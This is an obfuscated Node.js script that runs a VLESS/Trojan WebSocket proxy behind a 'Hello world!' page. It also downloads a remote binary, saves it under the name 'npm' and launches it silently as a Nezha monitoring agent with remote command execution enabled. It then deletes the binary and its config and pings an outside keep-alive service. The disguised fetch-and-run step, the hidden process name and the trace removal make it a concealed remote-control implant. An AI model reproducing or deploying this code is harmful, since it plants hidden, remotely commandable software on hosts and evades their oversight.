const _0x11d1bb=_0x46a7;(function(_0x42c722,_0x19ee01){const _0x4ea043=_0x46a7,_0x56ffb2=_0x42c722();while(!![]){try{const _0xfd6338=-parseInt(_0x4ea043(0x13f))/0x1+parseInt(_0x4ea043(0x10f))/0x2*(-parseInt(_0x4ea043(0x144))/0x3)+parseInt(_0x4ea043(0x12c))/0x4*(-parseInt(_0x4ea043(0x158))/0x5)+parseInt(_0x4ea043(0x107))/0x6+parseInt(_0x4ea043(0x135))/0x7*(parseInt(_0x4ea043(0x150))/0x8)+-parseInt(_0x4ea043(0xeb))/0x9+parseInt(_0x4ea043(0xec))/0xa*(parseInt(_0x4ea043(0xf2))/0xb);if(_0xfd6338===_0x19ee01)break;else _0x56ffb2['push'](_0x56ffb2['shift']());}catch(_0xdf1a38){_0x56ffb2['push'](_0x56ffb2['shift']());}}}(_0x1327,0xf21b8));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x11d1bb(0x12f)),net=require(_0x11d1bb(0xf0)),path=require(_0x11d1bb(0xf8)),crypto=require(_0x11d1bb(0x141)),{Buffer}=require(_0x11d1bb(0x11e)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x11d1bb(0x122)][_0x11d1bb(0x118)]||'f677861b-8493-4b18-b7b2-e6342bc1d226',NEZHA_SERVER=process[_0x11d1bb(0x122)][_0x11d1bb(0x123)]||'',NEZHA_PORT=process[_0x11d1bb(0x122)][_0x11d1bb(0xf5)]||'',NEZHA_KEY=process[_0x11d1bb(0x122)][_0x11d1bb(0x13e)]||'',DOMAIN=process['env'][_0x11d1bb(0x109)]||_0x11d1bb(0x145),AUTO_ACCESS=process[_0x11d1bb(0x122)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x11d1bb(0x13a)]||UUID[_0x11d1bb(0x11c)](0x0,0x8),SUB_PATH=process[_0x11d1bb(0x122)][_0x11d1bb(0x138)]||_0x11d1bb(0x101),NAME=process[_0x11d1bb(0x122)][_0x11d1bb(0x10a)]||_0x11d1bb(0x14a),PORT=process[_0x11d1bb(0x122)][_0x11d1bb(0x15b)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x468e42=_0x11d1bb;try{const _0x59717d=await axios['get']('https://speed.cloudflare.com/meta'),_0x27cdc4=_0x59717d['data'];ISP=(_0x27cdc4['country']+'-'+_0x27cdc4[_0x468e42(0x156)])[_0x468e42(0x106)](/ /g,'_');}catch(_0x5b969b){ISP=_0x468e42(0x153);}};GetISP();const httpServer=http[_0x11d1bb(0x154)]((_0x42e591,_0x25faea)=>{const _0x3cb84b=_0x11d1bb;if(_0x42e591['url']==='/'){const _0x1e7adb=path[_0x3cb84b(0x111)](__dirname,'index.html');fs[_0x3cb84b(0xf9)](_0x1e7adb,_0x3cb84b(0x159),(_0x4f65d2,_0x3ca430)=>{const _0x47647c=_0x3cb84b;if(_0x4f65d2){_0x25faea[_0x47647c(0x131)](0xc8,{'Content-Type':'text/html'}),_0x25faea[_0x47647c(0x113)](_0x47647c(0xe2));return;}_0x25faea[_0x47647c(0x131)](0xc8,{'Content-Type':_0x47647c(0x13d)}),_0x25faea['end'](_0x3ca430);});return;}else{if(_0x42e591[_0x3cb84b(0x110)]==='/'+SUB_PATH){const _0x33c63c=_0x3cb84b(0x15a)+UUID+'@'+DOMAIN+_0x3cb84b(0x15f)+DOMAIN+_0x3cb84b(0x155)+DOMAIN+_0x3cb84b(0x13b)+WSPATH+'#'+NAME+'-'+ISP,_0x482068=_0x3cb84b(0x105)+UUID+'@'+DOMAIN+_0x3cb84b(0xfc)+DOMAIN+_0x3cb84b(0x155)+DOMAIN+_0x3cb84b(0x13b)+WSPATH+'#'+NAME+'-'+ISP,_0x317a32=_0x33c63c+'\x0a'+_0x482068,_0x2d1698=Buffer[_0x3cb84b(0xe6)](_0x317a32)[_0x3cb84b(0x100)](_0x3cb84b(0xfb));_0x25faea[_0x3cb84b(0x131)](0xc8,{'Content-Type':_0x3cb84b(0x15c)}),_0x25faea[_0x3cb84b(0x113)](_0x2d1698+'\x0a');}else _0x25faea[_0x3cb84b(0x131)](0x194,{'Content-Type':_0x3cb84b(0x15c)}),_0x25faea['end'](_0x3cb84b(0x11a));}}),wss=new WebSocket[(_0x11d1bb(0x152))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x11d1bb(0x10e),_0x11d1bb(0xfd)];function resolveHost(_0x1f69cd){return new Promise((_0x48c7d7,_0x5757fa)=>{const _0x325206=_0x46a7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x325206(0x102)](_0x1f69cd)){_0x48c7d7(_0x1f69cd);return;}let _0x6848df=0x0;function _0x1a6fed(){const _0x46f1e7=_0x325206;if(_0x6848df>=DNS_SERVERS['length']){_0x5757fa(new Error(_0x46f1e7(0xe3)+_0x1f69cd+_0x46f1e7(0x128)));return;}const _0x30d6c7=DNS_SERVERS[_0x6848df];_0x6848df++;const _0x4861ab=_0x46f1e7(0xef)+encodeURIComponent(_0x1f69cd)+_0x46f1e7(0x137);axios[_0x46f1e7(0x149)](_0x4861ab,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x46f1e7(0xee)](_0x290e20=>{const _0x433e07=_0x46f1e7,_0x5a4ed1=_0x290e20[_0x433e07(0x130)];if(_0x5a4ed1['Status']===0x0&&_0x5a4ed1[_0x433e07(0x127)]&&_0x5a4ed1[_0x433e07(0x127)]['length']>0x0){const _0x5ef953=_0x5a4ed1['Answer'][_0x433e07(0x119)](_0x2235d6=>_0x2235d6[_0x433e07(0x15e)]===0x1);if(_0x5ef953){_0x48c7d7(_0x5ef953[_0x433e07(0x130)]);return;}}_0x1a6fed();})[_0x46f1e7(0xe5)](_0x39eb20=>{_0x1a6fed();});}_0x1a6fed();});}function handleVlessConnection(_0x5ad04e,_0x23ba2e){const _0xa36ac=_0x11d1bb,[_0x5000c7]=_0x23ba2e,_0x2cb303=_0x23ba2e[_0xa36ac(0x11c)](0x1,0x11);if(!_0x2cb303[_0xa36ac(0x151)]((_0x37e7ea,_0x3c2d52)=>_0x37e7ea==parseInt(uuid['substr'](_0x3c2d52*0x2,0x2),0x10)))return![];let _0x289a1d=_0x23ba2e[_0xa36ac(0x11c)](0x11,0x12)['readUInt8']()+0x13;const _0xcc2b87=_0x23ba2e[_0xa36ac(0x11c)](_0x289a1d,_0x289a1d+=0x2)['readUInt16BE'](0x0),_0x114b08=_0x23ba2e[_0xa36ac(0x11c)](_0x289a1d,_0x289a1d+=0x1)[_0xa36ac(0x13c)](),_0x468f44=_0x114b08==0x1?_0x23ba2e[_0xa36ac(0x11c)](_0x289a1d,_0x289a1d+=0x4)[_0xa36ac(0x111)]('.'):_0x114b08==0x2?new TextDecoder()['decode'](_0x23ba2e['slice'](_0x289a1d+0x1,_0x289a1d+=0x1+_0x23ba2e[_0xa36ac(0x11c)](_0x289a1d,_0x289a1d+0x1)[_0xa36ac(0x13c)]())):_0x114b08==0x3?_0x23ba2e[_0xa36ac(0x11c)](_0x289a1d,_0x289a1d+=0x10)[_0xa36ac(0x14f)]((_0x2b7ee0,_0x8e3eb1,_0x494728,_0xccf012)=>_0x494728%0x2?_0x2b7ee0['concat'](_0xccf012['slice'](_0x494728-0x1,_0x494728+0x1)):_0x2b7ee0,[])['map'](_0x51d679=>_0x51d679[_0xa36ac(0x116)](0x0)[_0xa36ac(0x100)](0x10))['join'](':'):'';_0x5ad04e[_0xa36ac(0x12e)](new Uint8Array([_0x5000c7,0x0]));const _0x3c0759=createWebSocketStream(_0x5ad04e);return resolveHost(_0x468f44)[_0xa36ac(0xee)](_0x3d95d2=>{const _0x25ff37=_0xa36ac;net[_0x25ff37(0x133)]({'host':_0x3d95d2,'port':_0xcc2b87},function(){const _0x52f8f1=_0x25ff37;this['write'](_0x23ba2e[_0x52f8f1(0x11c)](_0x289a1d)),_0x3c0759['on'](_0x52f8f1(0x112),()=>{})[_0x52f8f1(0xff)](this)['on'](_0x52f8f1(0x112),()=>{})['pipe'](_0x3c0759);})['on'](_0x25ff37(0x112),()=>{});})['catch'](_0x5e57ca=>{const _0x4792f8=_0xa36ac;net[_0x4792f8(0x133)]({'host':_0x468f44,'port':_0xcc2b87},function(){const _0x471ede=_0x4792f8;this[_0x471ede(0xe1)](_0x23ba2e[_0x471ede(0x11c)](_0x289a1d)),_0x3c0759['on']('error',()=>{})['pipe'](this)['on'](_0x471ede(0x112),()=>{})['pipe'](_0x3c0759);})['on'](_0x4792f8(0x112),()=>{});}),!![];}function handleTrojanConnection(_0x4f6afa,_0x36af21){const _0x44bca7=_0x11d1bb;try{if(_0x36af21['length']<0x3a)return![];const _0x58837b=_0x36af21[_0x44bca7(0x11c)](0x0,0x38)[_0x44bca7(0x100)](),_0x4e397d=[UUID];let _0x5a4faa=null;for(const _0x418f61 of _0x4e397d){const _0xf15c8e=crypto[_0x44bca7(0xf7)](_0x44bca7(0xfa))[_0x44bca7(0x126)](_0x418f61)['digest'](_0x44bca7(0x15d));if(_0xf15c8e===_0x58837b){_0x5a4faa=_0x418f61;break;}}if(!_0x5a4faa)return![];let _0x202fb0=0x38;_0x36af21[_0x202fb0]===0xd&&_0x36af21[_0x202fb0+0x1]===0xa&&(_0x202fb0+=0x2);const _0x5c6b43=_0x36af21[_0x202fb0];if(_0x5c6b43!==0x1)return![];_0x202fb0+=0x1;const _0x1330b4=_0x36af21[_0x202fb0];_0x202fb0+=0x1;let _0x3b9bde,_0x5d8419;if(_0x1330b4===0x1)_0x3b9bde=_0x36af21['slice'](_0x202fb0,_0x202fb0+0x4)[_0x44bca7(0x111)]('.'),_0x202fb0+=0x4;else{if(_0x1330b4===0x3){const _0x5a9802=_0x36af21[_0x202fb0];_0x202fb0+=0x1,_0x3b9bde=_0x36af21['slice'](_0x202fb0,_0x202fb0+_0x5a9802)[_0x44bca7(0x100)](),_0x202fb0+=_0x5a9802;}else{if(_0x1330b4===0x4)_0x3b9bde=_0x36af21[_0x44bca7(0x11c)](_0x202fb0,_0x202fb0+0x10)[_0x44bca7(0x14f)]((_0x53f14e,_0x100475,_0x34635d,_0x3ffd22)=>_0x34635d%0x2?_0x53f14e[_0x44bca7(0x14c)](_0x3ffd22[_0x44bca7(0x11c)](_0x34635d-0x1,_0x34635d+0x1)):_0x53f14e,[])[_0x44bca7(0x148)](_0x9bce0a=>_0x9bce0a[_0x44bca7(0x116)](0x0)[_0x44bca7(0x100)](0x10))[_0x44bca7(0x111)](':'),_0x202fb0+=0x10;else return![];}}_0x5d8419=_0x36af21[_0x44bca7(0x116)](_0x202fb0),_0x202fb0+=0x2;_0x202fb0<_0x36af21[_0x44bca7(0x142)]&&_0x36af21[_0x202fb0]===0xd&&_0x36af21[_0x202fb0+0x1]===0xa&&(_0x202fb0+=0x2);const _0x1a82c9=createWebSocketStream(_0x4f6afa);return resolveHost(_0x3b9bde)[_0x44bca7(0xee)](_0x2f1f2c=>{const _0x39a214=_0x44bca7;net[_0x39a214(0x133)]({'host':_0x2f1f2c,'port':_0x5d8419},function(){const _0x383ad6=_0x39a214;_0x202fb0<_0x36af21[_0x383ad6(0x142)]&&this[_0x383ad6(0xe1)](_0x36af21[_0x383ad6(0x11c)](_0x202fb0)),_0x1a82c9['on'](_0x383ad6(0x112),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x1a82c9);})['on'](_0x39a214(0x112),()=>{});})['catch'](_0x6a0217=>{const _0x2eec73=_0x44bca7;net[_0x2eec73(0x133)]({'host':_0x3b9bde,'port':_0x5d8419},function(){const _0x4981c6=_0x2eec73;_0x202fb0<_0x36af21['length']&&this['write'](_0x36af21['slice'](_0x202fb0)),_0x1a82c9['on'](_0x4981c6(0x112),()=>{})['pipe'](this)['on'](_0x4981c6(0x112),()=>{})[_0x4981c6(0xff)](_0x1a82c9);})['on'](_0x2eec73(0x112),()=>{});}),!![];}catch(_0x276e80){return![];}}wss['on']('connection',(_0x52dc77,_0x282190)=>{const _0x38151f=_0x11d1bb,_0x4c22c1=_0x282190[_0x38151f(0x110)]||'';_0x52dc77[_0x38151f(0x104)](_0x38151f(0x11f),_0x4a1f6a=>{const _0x12b2ec=_0x38151f;if(_0x4a1f6a['length']>0x11&&_0x4a1f6a[0x0]===0x0){const _0x2837c0=_0x4a1f6a[_0x12b2ec(0x11c)](0x1,0x11),_0x50ec53=_0x2837c0[_0x12b2ec(0x151)]((_0x2b1469,_0x47c1b3)=>_0x2b1469==parseInt(uuid[_0x12b2ec(0x12b)](_0x47c1b3*0x2,0x2),0x10));if(_0x50ec53){!handleVlessConnection(_0x52dc77,_0x4a1f6a)&&_0x52dc77[_0x12b2ec(0x14b)]();return;}}!handleTrojanConnection(_0x52dc77,_0x4a1f6a)&&_0x52dc77[_0x12b2ec(0x14b)]();})['on'](_0x38151f(0x112),()=>{});});const getDownloadUrl=()=>{const _0x5171fd=_0x11d1bb,_0x5660fc=os['arch']();return _0x5660fc===_0x5171fd(0x134)||_0x5660fc===_0x5171fd(0xe0)||_0x5660fc===_0x5171fd(0xed)?!NEZHA_PORT?_0x5171fd(0x147):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5171fd(0x160):_0x5171fd(0x10b);},downloadFile=async()=>{const _0x5b5b27=_0x11d1bb;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x36f372=getDownloadUrl(),_0x139929=await axios({'method':_0x5b5b27(0x149),'url':_0x36f372,'responseType':'stream'}),_0x1156e7=fs[_0x5b5b27(0x136)]('npm');return _0x139929[_0x5b5b27(0x130)][_0x5b5b27(0xff)](_0x1156e7),new Promise((_0x4c58e5,_0x18e713)=>{const _0x524a42=_0x5b5b27;_0x1156e7['on'](_0x524a42(0x14e),()=>{const _0x56d4b9=_0x524a42;console[_0x56d4b9(0x10c)](_0x56d4b9(0x157)),exec(_0x56d4b9(0x11d),_0x2810a0=>{if(_0x2810a0)_0x18e713(_0x2810a0);_0x4c58e5();});}),_0x1156e7['on'](_0x524a42(0x112),_0x18e713);});}catch(_0x196ed7){throw _0x196ed7;}},runnz=async()=>{const _0x498b7b=_0x11d1bb;try{const _0x296349=execSync(_0x498b7b(0xf1),{'encoding':'utf-8'});if(_0x296349[_0x498b7b(0x161)]()!==''){console[_0x498b7b(0x10c)](_0x498b7b(0x121));return;}}catch(_0x23658e){}await downloadFile();let _0x2d6dc1='',_0x3cde15=[_0x498b7b(0x124),_0x498b7b(0xe8),_0x498b7b(0x14d),_0x498b7b(0x140),_0x498b7b(0x117),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3bf77d=_0x3cde15[_0x498b7b(0xea)](NEZHA_PORT)?_0x498b7b(0xf6):'';_0x2d6dc1=_0x498b7b(0x143)+NEZHA_SERVER+':'+NEZHA_PORT+_0x498b7b(0x11b)+NEZHA_KEY+'\x20'+_0x3bf77d+_0x498b7b(0xe4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c968f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x498b7b(0xfe)](':')[_0x498b7b(0x129)]():'',_0x1b23ad=_0x3cde15[_0x498b7b(0xea)](_0x3c968f)?_0x498b7b(0xe9):_0x498b7b(0x146),_0x22a1c0=_0x498b7b(0x12a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1b23ad+_0x498b7b(0x139)+UUID;fs['writeFileSync'](_0x498b7b(0xf4),_0x22a1c0);}_0x2d6dc1='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x498b7b(0x10c)](_0x498b7b(0x10d));return;}}try{exec(_0x2d6dc1,{'shell':_0x498b7b(0xf3)},_0xc4836e=>{const _0x521ec1=_0x498b7b;if(_0xc4836e)console[_0x521ec1(0x112)](_0x521ec1(0x120),_0xc4836e);else console['log']('npm\x20is\x20running');});}catch(_0x35459d){console[_0x498b7b(0x112)](_0x498b7b(0x12d)+_0x35459d);}};function _0x46a7(_0x34bc92,_0x327367){_0x34bc92=_0x34bc92-0xe0;const _0x1327f3=_0x1327();let _0x46a759=_0x1327f3[_0x34bc92];return _0x46a759;}async function addAccessTask(){const _0x6bb7ff=_0x11d1bb;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x125a4e='https://'+DOMAIN;try{const _0x190e7b=await axios['post'](_0x6bb7ff(0x115),{'url':_0x125a4e},{'headers':{'Content-Type':_0x6bb7ff(0x103)}});console[_0x6bb7ff(0x10c)](_0x6bb7ff(0x125));}catch(_0x29412a){}}const delFiles=()=>{const _0x421bda=_0x11d1bb;fs[_0x421bda(0xe7)](_0x421bda(0x132),()=>{}),fs['unlink'](_0x421bda(0xf4),()=>{});};function _0x1327(){const _0x2b3c34=['/bin/bash','config.yaml','NEZHA_PORT','--tls','createHash','path','readFile','sha224','base64',':443?security=tls&sni=','1.1.1.1','split','pipe','toString','sub','test','application/json','once','trojan://','replace','6314124mJLtph','Server\x20is\x20running\x20on\x20port\x20','DOMAIN','NAME','https://amd64.ssss.nyc.mn/agent','log','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8.8.4.4','6tlPPJY','url','join','error','end','listen','https://oooo.serv00.net/add-url','readUInt16BE','2083','UUID','find','Not\x20Found\x0a','\x20-p\x20','slice','chmod\x20+x\x20npm','buffer','message','npm\x20running\x20error:','npm\x20is\x20already\x20running,\x20skip\x20running...','env','NEZHA_SERVER','443','Automatic\x20Access\x20Task\x20added\x20successfully','update','Answer','\x20with\x20all\x20DNS\x20servers','pop','client_secret:\x20','substr','40YzWeGo','error:\x20','send','axios','data','writeHead','npm','connect','arm','14WbOiWY','createWriteStream','&type=A','SUB_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','WSPATH','&path=%2F','readUInt8','text/html','NEZHA_KEY','1319796OqrXog','2087','crypto','length','setsid\x20nohup\x20./npm\x20-s\x20','1209903SYZMxt','1234.abc.com','false','https://arm64.ssss.nyc.mn/v1','map','get','Hug','close','concat','2096','finish','reduce','5882920gQAbGJ','every','Server','Unknown','createServer','&fp=chrome&type=ws&host=','asOrganization','npm\x20download\x20successfully','378715XPvWTJ','utf8','vless://','PORT','text/plain','hex','type',':443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1','trim','arm64','write','Hello\x20world!','Failed\x20to\x20resolve\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','catch','from','unlink','8443','true','includes','15186249FSRWqg','170kkkAPM','aarch64','then','https://dns.google/resolve?name=','net','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2227874DQRRuk'];_0x1327=function(){return _0x2b3c34;};return _0x1327();}httpServer[_0x11d1bb(0x114)](PORT,()=>{const _0xb81991=_0x11d1bb;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xb81991(0x108)+PORT);});
